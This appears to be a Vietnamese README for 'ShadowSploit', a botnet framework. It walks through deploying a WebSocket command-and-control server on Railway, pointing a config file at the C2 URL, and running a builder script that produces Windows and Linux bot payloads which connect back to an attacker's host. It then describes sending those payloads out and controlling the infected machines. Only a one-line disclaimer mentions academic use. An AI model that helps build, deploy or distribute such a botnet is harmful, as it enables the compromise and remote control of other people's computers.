# ShadowSploit - **Botnet Framework**

## 🚀 **Giới thiệu**

**ShadowSploit** là một framework **botnet** mã nguồn mở được phát triển cho **Kali Linux** và **Windows**. Framework này cho phép bạn xây dựng và quản lý botnet dễ dàng qua **WebSocket C2 Server**. 

### 💡 **Lợi ích**:
- Quản lý botnet qua **giao thức WebSocket**.
- Dễ dàng triển khai và tùy chỉnh.
- Hỗ trợ cả **Windows** và **Linux**.

## 🔧 **Cài đặt**

Để sử dụng **ShadowSploit**, bạn cần cài đặt **Python 3.6 trở lên** và các thư viện cần thiết.

**Bước 1**: Cài đặt các thư viện yêu cầu:
```bash
pip install -r requirements.txt 
```
Bước 2: Clone repository về máy của bạn:
```bash
git clone https://github.com/yourusername/ShadowSploit.git
cd ShadowSploit
```
Bước 3: Tạo môi trường ảo (tuỳ chọn):
```bash
python3 -m venv venv
source venv/bin/activate   # Trên Linux / macOS
venv\Scripts\activate      # Trên Windows
```
Bước 4: Cài đặt các phụ thuộc:
```bash
pip install -r requirements.txt
```

🌐 Chạy WebSocket C2 Server trên Railway
Tạo và Cấu Hình Server trên Railway
ShadowSploit có thể dễ dàng triển khai WebSocket C2 Server trên Railway để phục vụ botnet của bạn. Dưới đây là các bước chi tiết để cấu hình và triển khai server trên Railway.

Bước 1: Tạo tài khoản Railway
Đầu tiên, bạn cần đăng ký tài khoản tại Railway.

Bước 2: Tạo một Project Mới trên Railway
Đăng nhập vào Railway.
Nhấn vào nút "New Project".
Chọn "Deploy from GitHub" để kết nối tài khoản GitHub của bạn với Railway.
Tìm kiếm và chọn repository của bạn, nơi bạn đã lưu mã nguồn của ShadowSploit.
Nhấn "Deploy".
Bước 3: Cấu hình môi trường cho server
Sau khi kết nối với repository, Railway sẽ tự động nhận diện mã nguồn của bạn. Tiếp theo, bạn cần cấu hình các biến môi trường để WebSocket C2 Server hoạt động chính xác.

Chọn "Settings" từ thanh menu của dự án trên Railway.
Thêm các biến môi trường sau (nếu cần thiết):
HOST: Địa chỉ IP của server (thường sẽ là 0.0.0.0 đối với Railway).
PORT: Cổng mà WebSocket server sẽ lắng nghe, ví dụ 8080.
Bước 4: Cấu hình tệp Procfile
Đảm bảo rằng bạn có một tệp Procfile trong repository của mình. Tệp này sẽ chỉ dẫn Railway cách chạy ứng dụng của bạn.

Ví dụ về Procfile:
```bash
web: python server.py
```
Bước 5: Triển khai Server
Sau khi cấu hình các biến môi trường và tệp Procfile, nhấn "Deploy" để triển khai server lên Railway. Quá trình triển khai sẽ tự động bắt đầu.

Bước 6: Truy cập URL của Server
Sau khi server được triển khai thành công, Railway sẽ cung cấp cho bạn một URL mà bạn có thể sử dụng để kết nối bot của mình tới WebSocket server.

URL của server sẽ có dạng:
```bash
https://your-project-name.up.railway.app
```
Lưu ý: Bạn có thể thay thế your-project-name bằng tên dự án thực tế của bạn trên Railway.

🔌 Liên kết WebSocket C2 Server với ShadowSploit
Bước 1: Cập nhật cấu hình WebSocket Server trong ShadowSploit
Sau khi bạn đã triển khai WebSocket C2 server trên Railway và nhận được URL của server, bạn cần cấu hình ShadowSploit để kết nối đến server này.

1. Mở file cấu hình config.json trong repository ShadowSploit.
2. Thêm hoặc cập nhật các thông tin sau:
```bash
{
  "C2_SERVER_URL": "https://your-project-name.up.railway.app",
  "C2_SERVER_PORT": "8080"
}
```
- C2_SERVER_URL: Đặt là URL bạn đã nhận được từ Railway.
- C2_SERVER_PORT: Cổng mà server WebSocket đang lắng nghe (ví dụ: 8080).

Bước 2: Khởi động WebSocket C2 Client
Sau khi cấu hình xong, bạn có thể khởi động bot của mình để kết nối đến WebSocket C2 server.
```bash
python3 client.py
```

🖥️ Cách sử dụng
Chạy WebSocket Server
Sau khi cài đặt xong, bạn cần chạy WebSocket C2 Server để có thể điều khiển botnet:
```bash
python3 server.py
```
Server này sẽ lắng nghe kết nối từ các bot.

Tạo Payload cho Windows hoặc Linux
Để tạo payload cho các bot, bạn có thể sử dụng builder.py. Chạy lệnh sau để tạo payload tương ứng với hệ điều hành:

Payload cho Windows:
```bash
python3 builder.py --payload windows --host 192.168.1.100 --port 8080 --output botnet.exe
```
Payload cho Linux:
```bash
python3 builder.py --payload linux --host 192.168.1.100 --port 8080 --output botnet.elf
```
Kết nối Bot với Server
Sau khi tạo payload và gửi cho các bot, chúng sẽ tự động kết nối với WebSocket Server bạn đã khởi động ở bước trước. Bạn có thể bắt đầu điều khiển chúng thông qua server này.

🔐 Lưu ý
⚠️ ShadowSploit chỉ nên được sử dụng cho các mục đích học thuật và kiểm tra bảo mật.

Không sử dụng cho các hoạt động tấn công bất hợp pháp hoặc xâm nhập vào hệ thống không được phép.

🔗 Tải về Cấu hình Server C2 từ Repository
Nếu bạn muốn sử dụng cấu hình WebSocket C2 Server đã được cấu hình sẵn, bạn có thể tải về từ repository sau:

- ShadowSploit C2 Server Configuration
Trong repository này, bạn sẽ tìm thấy toàn bộ cấu hình sẵn của WebSocket C2 Server đã được cấu hình để triển khai trên Railway và các hướng dẫn chi tiết về cách sử dụng.

Cách tải về và triển khai từ cấu hình sẵn:
1. Truy cập vào repo cấu hình C2.
2. Clone repository về máy của bạn:
```bash
git clone https://github.com/yourusername/ShadowSploit-c2-setup.git
cd ShadowSploit-c2-setup
```
3. Lưu ý rằng repository này đã chứa toàn bộ cấu hình cho Railway. Bạn chỉ cần tải về và triển khai trên Railway theo hướng dẫn dưới đây.
🧑‍💻 Liên hệ
Nếu bạn gặp khó khăn khi sử dụng ShadowSploit, vui lòng mở Issue trên GitHub hoặc gửi email cho chúng tôi tại: youremail@example.com.

Tham gia cộng đồng: GitHub Repository



